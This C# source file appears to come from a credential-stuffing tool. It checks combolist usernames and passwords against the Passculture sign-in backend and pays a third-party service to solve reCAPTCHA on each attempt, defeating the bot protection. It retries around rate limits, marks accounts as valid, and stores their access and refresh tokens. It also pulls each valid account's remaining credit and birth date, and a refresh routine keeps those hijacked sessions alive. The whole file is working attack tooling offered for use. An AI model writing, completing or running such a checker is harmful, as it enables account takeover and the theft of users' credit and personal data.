using DataVortex.Core.Abstractions;
using DataVortex.Core.Models;
using DataVortex.Core.Passculture;
using Microsoft.Extensions.Logging;

namespace DataVortex.Core.Accounts;

/// <summary>
/// The single, shared path for testing one credential against Passculture. Every caller (live processing,
/// the startup catch-up scan, and the manual "Test accounts" button) goes through here, so an account is
/// reserved atomically in <see cref="IAccountTestRegistry"/> and sent to the backend at most once — no
/// matter how many records or files contain it, across workers and across restarts.
/// </summary>
public static class AccountTester
{
    private const int MaxCheckRetries = 3; // extra attempts on non-definitive responses (so up to 4 total)
    private static volatile SemaphoreSlim _gate = new(10, 10);
    private static int _maxParallel = 10;
    private static ILogger? _log;

    /// <summary>Raised when a credential is abandoned after exhausting retries (non-definitive responses).
    /// The UI uses it to count the RETRY category (these accounts are not persisted, so they stay retryable).</summary>
    public static event Action? RetryAbandoned;

    /// <summary>Wires a logger so the checker emits live per-account traces (captcha request, sign-in,
    /// 429 retries, result). Set once at startup; logging is a no-op until then.</summary>
    public static void SetLogger(ILogger logger) => _log = logger;

    /// <summary>Sets the global cap on concurrent backend checks (clamped 1..10). Applied at startup and on Save.
    /// Existing in-flight checks keep their own gate; only new checks see the new cap.</summary>
    public static void ConfigureParallelism(int max)
    {
        max = Math.Clamp(max, 1, 10);
        if (max == _maxParallel) return;
        _maxParallel = max;
        _gate = new SemaphoreSlim(max, max);
    }

    /// <summary>Tests a credential at most once globally. Returns the credential updated with the outcome,
    /// or unchanged if it was already tested, has no identity, or is being tested elsewhere right now.</summary>
    public static async Task<CredentialEntry> TestOnceAsync(
        PasscultureClient passClient, IAccountTestRegistry registry, CredentialEntry cred, CancellationToken ct = default)
    {
        if (cred.Tested) return cred;
        if (string.IsNullOrWhiteSpace(cred.Username) && string.IsNullOrWhiteSpace(cred.Password)) return cred;

        // Already known? reuse the stored outcome without touching the backend.
        if (registry.TryGet(cred.Username, cred.Password, out var known))
            return Apply(cred, known);

        // Claim it atomically; if anyone else holds it, do not send a duplicate.
        if (!registry.TryReserve(cred.Username, cred.Password, cred.Url))
            return cred;

        // Global cap on concurrent backend calls (combolist, archive flow and manual button all share it).
        var gate = _gate;
        await gate.WaitAsync(ct).ConfigureAwait(false);
        try
        {
            for (int attempt = 0; ; attempt++)
            {
                if (attempt > 0)
                {
                    // Backoff before retrying a non-definitive response (429 / 5xx / network / captcha failure).
                    var delay = TimeSpan.FromSeconds(Math.Min(30, 2 * Math.Pow(2, attempt - 1))); // 2,4,8,…
                    await Task.Delay(delay, ct).ConfigureAwait(false);
                }

                // A reCAPTCHA token is single-use, so we solve a FRESH captcha for every attempt.
                _log?.LogInformation("Check {Email}: demande d'un captcha à 2captcha (essai {Attempt})", cred.Username, attempt + 1);
                var captcha = await passClient.SolveCaptchaAsync(ct).ConfigureAwait(false);
                if (captcha is null)
                {
                    _log?.LogWarning("Check {Email}: captcha non résolu (essai {Attempt})", cred.Username, attempt + 1);
                    if (attempt < MaxCheckRetries) continue;
                    RetryAbandoned?.Invoke();
                    registry.Release(cred.Username, cred.Password);
                    return cred;
                }

                _log?.LogInformation("Check {Email}: POST signin → backend Passculture (essai {Attempt})", cred.Username, attempt + 1);
                var signin = await passClient.SignInAsync(cred.Username ?? "", cred.Password ?? "", captcha, ct).ConfigureAwait(false);

                // Definitive outcomes only: 200 = valid account, 400 = wrong password. Anything else → retry.
                if (signin.StatusCode == 200 || signin.StatusCode == 400)
                {
                    var success = signin.StatusCode == 200;
                    decimal? credit = null;
                    string? birth = null;
                    if (success && signin.AccessToken is not null)
                    {
                        try
                        {
                            var me = await passClient.GetMeAsync(signin.AccessToken, ct).ConfigureAwait(false);
                            credit = me.DomainsCreditRemaining;
                            birth = me.BirthDate;
                        }
                        catch { /* credit/birth are best-effort */ }
                    }

                    _log?.LogInformation("Check {Email}: ← HTTP {Code} → {Verdict}{Credit}",
                        cred.Username, signin.StatusCode,
                        success ? "VALIDE" : "mot de passe incorrect",
                        success ? $" (crédit={credit})" : "");

                    var result = new AccountTestResult(
                        success, signin.StatusCode, signin.AccessToken, signin.RefreshToken,
                        credit, birth, signin.Raw, DateTime.UtcNow, signin.AccountState);
                    registry.Complete(cred.Username, cred.Password, result);
                    return Apply(cred, result);
                }

                // Non-definitive (429 / 5xx / 0 / …) → retry up to the cap, else give up (retryable later).
                if (attempt < MaxCheckRetries)
                {
                    _log?.LogWarning("Check {Email}: HTTP {Code} (non définitif) → nouvel essai ({Attempt}/{Max})",
                        cred.Username, signin.StatusCode, attempt + 1, MaxCheckRetries);
                    continue;
                }

                _log?.LogWarning("Check {Email}: abandonné après {Total} essai(s) (dernier HTTP {Code}) — réessayable plus tard",
                    cred.Username, MaxCheckRetries + 1, signin.StatusCode);
                RetryAbandoned?.Invoke();
                registry.Release(cred.Username, cred.Password);
                return cred;
            }
        }
        catch
        {
            registry.Release(cred.Username, cred.Password);
            return cred;
        }
        finally
        {
            gate.Release();
        }
    }

    /// <summary>Re-fetches credit + birth date for an already-tested account by reusing its stored tokens —
    /// no captcha, no sign-in. Mints a fresh access token from the refresh token, then reads <c>/me</c>, and
    /// persists the updated outcome. Returns whether the account was updated and whether a credit was obtained.</summary>
    public static async Task<(bool updated, bool gotCredit)> RefreshCreditAsync(
        PasscultureClient passClient, IAccountTestRegistry registry, AccountRecord account, CancellationToken ct = default)
    {
        // The stored access token is short-lived (~15 min), so refresh it from the long-lived refresh token first.
        var access = !string.IsNullOrEmpty(account.RefreshToken)
            ? await passClient.RefreshAccessTokenAsync(account.RefreshToken!, ct).ConfigureAwait(false) ?? account.AccessToken
            : account.AccessToken;
        if (string.IsNullOrEmpty(access)) return (false, false);

        MeResult me;
        try { me = await passClient.GetMeAsync(access!, ct).ConfigureAwait(false); }
        catch { return (false, false); }
        if (!me.Success) return (false, false); // transient failure → leave it for a later refresh

        var result = new AccountTestResult(
            account.Success, account.StatusCode, access, account.RefreshToken,
            me.DomainsCreditRemaining, me.BirthDate, account.Message, DateTime.UtcNow, account.AccountState);
        registry.Complete(account.Email, account.Password, result);
        _log?.LogInformation("Refresh {Email}: crédit={Credit}", account.Email, me.DomainsCreditRemaining);
        return (true, me.DomainsCreditRemaining is not null);
    }

    /// <summary>Folds a registry outcome back into a <see cref="CredentialEntry"/> (for the per-file record).</summary>
    public static CredentialEntry Apply(CredentialEntry cred, AccountTestResult r)
        => cred with
        {
            Tested = true,
            TestSuccess = r.Success,
            TestMessage = r.Message,
            TestedUtc = r.TestedUtc,
            AccessToken = r.AccessToken,
            RefreshToken = r.RefreshToken,
            Credit = r.Credit,
            BirthDate = r.BirthDate,
            StatusCode = r.StatusCode
        };
}
